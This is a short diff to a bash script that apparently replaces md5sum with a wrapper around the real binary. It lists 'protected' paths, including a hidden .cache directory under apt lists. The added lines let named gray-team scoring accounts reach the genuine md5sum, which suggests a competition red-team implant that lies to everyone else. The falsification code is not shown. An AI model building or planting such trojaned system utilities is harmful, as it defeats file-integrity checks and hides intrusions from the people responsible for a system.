@@ -1,6 +1,12 @@
 #!/bin/bash
 REAL_MD5="/usr/bin/md5sum"
 
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_MD5 "$@" ;;
+esac
+
+
 PROTECTED=(
     "/usr/local/bin"
     "/var/lib/apt/lists/.cache"
